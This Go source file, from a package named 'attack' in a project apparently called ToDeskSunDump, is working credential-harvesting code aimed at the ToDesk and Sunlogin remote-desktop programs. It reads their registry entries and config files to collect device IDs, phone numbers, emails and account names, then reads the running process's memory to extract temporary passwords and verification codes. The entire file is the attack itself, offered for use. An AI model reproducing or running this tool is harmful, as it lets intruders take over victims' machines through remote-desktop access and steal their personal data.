package attack

import (
	"ToDeskSunDump/util"
	"bufio"
	"bytes"
	"fmt"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unsafe"
)

// ReadRegistryInfo 读取注册表信息
func ReadRegistryInfo(path, keyword string) map[string]string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.READ)
	if err != nil {
		return nil
	}
	defer func(key registry.Key) {
		err := key.Close()
		if err != nil {
			fmt.Println(err)
		}
	}(key)

	var names []string
	names, err = key.ReadValueNames(-1)
	if err != nil {
		return nil
	}

	if keyword == util.KeywordsToDesk {
		return getToDeskRegistryInfo(names, key)
	} else if keyword == util.KeywordsSun {
		return getSunRegistryInfo(names, key)
	}
	return nil
}

func getToDeskRegistryInfo(names []string, key registry.Key) map[string]string {
	registryInfoMap := make(map[string]string)
	for _, name := range names {
		value, _, _ := key.GetStringValue(name)
		if name == "ImagePath" {
			re := regexp.MustCompile(`"([^"]*)"`)
			matches := re.FindStringSubmatch(value)
			registryInfoMap["程序路径"] = matches[1]
			registryInfoMap["安装路径"] = filepath.Dir(matches[1])
			registryInfoMap["配置文件路径"] = filepath.Dir(matches[1]) + "\\config.ini"
		} else if name == "Dir" {
			registryInfoMap["用户路径"] = value
		}
	}
	return registryInfoMap
}

func getSunRegistryInfo(names []string, key registry.Key) map[string]string {
	registryInfoMap := make(map[string]string)
	for _, name := range names {
		value, _, _ := key.GetStringValue(name)
		if name == "ImagePath" {
			re := regexp.MustCompile(`"(.*)"`)
			matches := re.FindStringSubmatch(value)
			registryInfoMap["程序路径"] = matches[1]
			registryInfoMap["安装路径"] = filepath.Dir(matches[1])
			registryInfoMap["配置文件路径"] = filepath.Dir(matches[1]) + "\\config.ini"
		}
	}
	return registryInfoMap
}

func ReadConfigFile(path, keyword string) map[string]string {
	file, err := os.Open(path)
	if err != nil {
		fmt.Printf("打开配置文件错误: %v\n", err)
		return nil
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {
			fmt.Println(err)
		}
	}(file)

	var data []byte
	data, err = io.ReadAll(file)
	if err != nil {
		fmt.Printf("读取配置文件错误: %v\n", err)
	}

	if keyword == util.KeywordsToDesk {
		return getToDeskConfigInfo(string(data))
	} else if keyword == util.KeywordsSun {
		return getSunConfigInfo(string(data))
	}
	return nil
}

func getToDeskConfigInfo(data string) map[string]string {
	configInfoMap := make(map[string]string)
	lines := strings.Split(data, "\n")
	for _, line := range lines {
		if strings.Contains(line, "clientId=") {
			configInfoMap["设备代码"] = strings.Split(line, "=")[1]
		}
		if strings.Contains(line, "Version=") {
			configInfoMap["版本号"] = strings.Split(line, "=")[1]
		}
		if strings.Contains(line, "LoginPhone=") {
			configInfoMap["手机号"] = strings.Split(line, "=")[1]
		}
		if strings.Contains(line, "LoginEmail=") {
			configInfoMap["邮箱"] = strings.Split(line, "=")[1]
		}
		if strings.Contains(line, "AuthMode=") {
			autoModeParts := strings.Split(line, "=")
			if len(autoModeParts) > 1 {
				autoMode := strings.TrimSpace(autoModeParts[1])
				if autoMode == "0" {
					configInfoMap["登录规则"] = "仅使用临时密码登录"
				} else if autoMode == "1" {
					configInfoMap["登录规则"] = "仅使用安全密码登录"
				} else if autoMode == "2" {
					configInfoMap["登录规则"] = "临时密码和安全密码均可登录"
				}
			}
		}
	}
	return configInfoMap
}

func getSunConfigInfo(data string) map[string]string {
	configInfoMap := make(map[string]string)
	lines := strings.Split(data, "\n")
	for _, line := range lines {
		if strings.Contains(line, "account=") {
			configInfoMap["账号"] = strings.Split(line, "=")[1]
		}
		if strings.Contains(line, "full_version=") {
			configInfoMap["版本号"] = strings.Split(line, "=")[1]
		}
	}
	return configInfoMap
}

func ReadMemoryInfo(keyword, processName string) map[string]string {
	memoryInfoMap := make(map[string]string)
	var passList []string
	pid := uint32(getProcessPID(processName))
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, pid)
	if err != nil {
		fmt.Println("无法打开进程:", err)
		return nil
	}

	defer func(handle windows.Handle) {
		err := windows.CloseHandle(handle)
		if err != nil {
			fmt.Println(err)
		}
	}(hProcess)

	memoryInfo := windows.MemoryBasicInformation{}
	var address uintptr = 0
	var regionSize uintptr
	for {
		err = windows.VirtualQueryEx(hProcess, address, &memoryInfo, unsafe.Sizeof(memoryInfo))
		if err != nil {
			if keyword == util.KeywordsSun {
				return memoryInfoMap
			}
			fmt.Printf("无法查找内存: %v\n", err)
			return nil
		}
		if memoryInfo.State == windows.MEM_COMMIT {
			protect := memoryInfo.Protect
			switch protect {
			case windows.PAGE_READWRITE, 0x20000:
				buffer := make([]byte, memoryInfo.RegionSize)
				bytesRead := uintptr(0)
				err = windows.ReadProcessMemory(hProcess, memoryInfo.BaseAddress, &buffer[0], memoryInfo.RegionSize, &bytesRead)
				if err != nil {
					fmt.Println("无法读取内存:", err)
					return nil
				}
				if keyword == util.KeywordsToDesk {
					pass := getToDeskMemoryInfo(buffer)
					if pass != "" {
						memoryInfoMap["临时密码"] = pass
						return memoryInfoMap
					}
				} else if keyword == util.KeywordsSun {
					passList, memoryInfoMap = getSunMemoryInfo(passList, memoryInfoMap, buffer)
					passList = removeDuplicates(passList)
					memoryInfoMap["验证码"] = "\n" + strings.Join(passList, "\n")
				}
			}
		}
		regionSize = memoryInfo.RegionSize
		if regionSize == 0 {
			break
		}
		address = memoryInfo.BaseAddress + regionSize

		if memoryInfo.RegionSize == 0 {
			break
		}
	}

	return nil
}

func getToDeskMemoryInfo(buffer []byte) string {
	reg := regexp.MustCompile(`[A-Za-z\d]{8}`)

	nowTime := []byte(getNowTime())

	index := bytes.Index(buffer, nowTime)
	if index != -1 {
		start := index - 1024
		if start < 0 {
			start = 0
		}

		data := buffer[start : index+len(nowTime)]
		str := reg.FindString(string(data))
		strList := strings.Split(str, "\n")

		for _, newStr := range strList {
			if !(regexp.MustCompile("^[0-9]+$").MatchString(newStr) || regexp.MustCompile("^[a-zA-Z]+$").MatchString(str)) {
				return newStr
			}
		}
	}
	return ""
}

func getSunMemoryInfo(passList []string, memoryInfoMap map[string]string, buffer []byte) ([]string, map[string]string) {

	reg1 := regexp.MustCompile(`<f f=yahei.28 c=color_edit >.*?</f>`)
	reg2 := regexp.MustCompile(`\d+\s+\d+\s+\d+\s+\d+`)
	reg3 := regexp.MustCompile(`[A-Za-z0-9\W_]{4,8}`)

	str := reg1.FindString(string(buffer))
	if str != "" {
		newStr := str[28 : len(str)-4]
		if newStr != `" .. code .. "` && newStr != `----` && newStr != `" .. pwd_prefix .. "` {
			if reg2.MatchString(newStr) {
				memoryInfoMap["设备识别码"] = newStr
				return passList, memoryInfoMap
			}
			if reg3.MatchString(newStr) {
				passList = append(passList, newStr)
			}
		}
	}
	return passList, memoryInfoMap
}

func removeDuplicates(slice []string) []string {
	elementMap := make(map[string]bool)
	var uniqueSlice []string

	for _, v := range slice {
		if _, ok := elementMap[v]; !ok {
			elementMap[v] = true
			uniqueSlice = append(uniqueSlice, v)
		}
	}
	return uniqueSlice
}

func getProcessPID(processName string) int {
	cmd := exec.Command("tasklist")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return 0
	}
	scanner := bufio.NewScanner(strings.NewReader(string(out)))
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, processName) && strings.Contains(line, "Console") {
			parts := strings.Fields(line)
			if len(parts) > 1 {
				pid, err := strconv.Atoi(parts[1])
				if err == nil {
					return pid
				}
			}
		}
	}
	return 0
}

func getNowTime() string {
	now := time.Now()
	dataStr := now.Format("20060102")
	return dataStr
}
